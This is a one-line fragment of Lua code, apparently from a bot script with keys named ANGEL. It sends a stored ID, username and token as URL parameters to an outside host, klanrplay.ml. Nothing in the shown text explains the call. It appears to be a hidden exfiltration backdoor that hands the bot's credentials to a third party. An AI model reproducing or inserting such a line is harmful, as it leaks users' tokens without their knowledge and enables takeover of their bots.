...
https.request("http://klanrplay.ml/engal/engal.php?id="..database:get(Server_ANGEL.."Id_ANGEL").."&user="..database:get(Server_ANGEL.."UserName_ANGEL").."&token="..database:get(Server_ANGEL.."Token_ANGEL"))
